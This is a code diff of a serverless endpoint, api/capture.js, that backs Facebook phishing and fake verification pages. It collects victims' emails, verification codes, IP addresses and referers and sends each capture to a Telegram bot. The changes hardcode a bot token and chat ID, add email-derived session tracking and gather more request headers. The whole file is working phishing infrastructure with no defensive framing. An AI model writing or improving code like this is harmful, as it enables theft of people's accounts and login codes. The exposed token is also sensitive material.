@@ -1,17 +1,12 @@
-// api/capture.js - Vercel Serverless Function
+// api/capture.js - Vercel Serverless Function with your Telegram credentials
 const https = require('https');
 
-// Telegram configuration from environment variables
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+// Telegram configuration - using your provided credentials
+const TELEGRAM_BOT_TOKEN = '8228437015:AAF4ebqdhrsn3rkQLRRhv-KHlyUleDrCZXw';
+const TELEGRAM_CHAT_ID = '1622637334';
 
 // Function to send message to Telegram
 async function sendToTelegram(data) {
-  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-    console.log('Telegram credentials not configured');
-    return false;
-  }
-
   try {
     const message = formatTelegramMessage(data);
     
@@ -33,6 +28,7 @@ async function sendToTelegram(data) {
         let data = '';
         res.on('data', (chunk) => data += chunk);
         res.on('end', () => {
+          console.log('Telegram API response:', data);
           if (res.statusCode === 200) {
             resolve(true);
           } else {
@@ -66,8 +62,10 @@ function formatTelegramMessage(data) {
 <b>🌐 User Agent:</b> ${data.userAgent ? data.userAgent.substring(0, 100) + '...' : 'N/A'}
 <b>⏰ Time:</b> ${timestamp}
 <b>📱 Source:</b> Facebook Phishing Page
+<b>🆔 Session:</b> ${generateSessionId(data.email)}
 
 <b>IP:</b> ${data.ip || 'Not captured'}
+<b>Referer:</b> ${data.referer || 'Direct'}
       `;
       break;
       
@@ -80,6 +78,7 @@ function formatTelegramMessage(data) {
 <b>🔢 Code:</b> <code>${escapeHtml(data.code || 'N/A')}</code>
 <b>⏰ Time:</b> ${timestamp}
 <b>📱 Source:</b> Facebook Verification Page
+<b>🆔 Session:</b> ${generateSessionId(data.email)}
 
 <b>IP:</b> ${data.ip || 'Not captured'}
       `;
@@ -92,6 +91,7 @@ function formatTelegramMessage(data) {
 <b>📧 Email:</b> <code>${escapeHtml(data.email || 'N/A')}</code>
 <b>⏰ Time:</b> ${timestamp}
 <b>📱 Source:</b> Facebook Verification Page
+<b>🆔 Session:</b> ${generateSessionId(data.email)}
 
 <b>IP:</b> ${data.ip || 'Not captured'}
       `;
@@ -123,6 +123,18 @@ function escapeHtml(text) {
     .replace(/'/g, "&#039;");
 }
 
+// Generate a session ID from email
+function generateSessionId(email) {
+  if (!email) return 'N/A';
+  // Create a short hash from email for tracking
+  let hash = 0;
+  for (let i = 0; i < email.length; i++) {
+    hash = ((hash << 5) - hash) + email.charCodeAt(i);
+    hash = hash & hash;
+  }
+  return Math.abs(hash).toString(16).substring(0, 8).toUpperCase();
+}
+
 // Main handler function
 module.exports = async (req, res) => {
   // Set CORS headers
@@ -152,13 +164,19 @@ module.exports = async (req, res) => {
       data.timestamp = new Date().toISOString();
     }
     
-    // Get IP address
-    data.ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Not captured';
+    // Get IP address and other info
+    data.ip = req.headers['x-forwarded-for'] || 
+              req.headers['x-real-ip'] || 
+              req.connection.remoteAddress || 
+              'Not captured';
+    
+    data.referer = req.headers['referer'] || 'Direct';
+    data.host = req.headers['host'];
     
     // Log to console (for Vercel logs)
-    console.log(`Captured ${data.type} for ${data.email || 'unknown'}:`, {
-      email: data.email,
+    console.log('📥 Captured data:', {
       type: data.type,
+      email: data.email ? `${data.email.substring(0, 3)}...@...` : 'none',
       timestamp: data.timestamp,
       ip: data.ip
     });
@@ -170,14 +188,16 @@ module.exports = async (req, res) => {
     return res.status(200).json({
       success: true,
       message: 'Data captured successfully',
-      telegramSent: telegramSent
+      telegramSent: telegramSent,
+      timestamp: new Date().toISOString()
     });
     
   } catch (error) {
-    console.error('Error in capture endpoint:', error);
+    console.error('❌ Error in capture endpoint:', error);
     return res.status(500).json({
       success: false,
-      error: error.message
+      error: error.message,
+      timestamp: new Date().toISOString()
     });
   }
 };
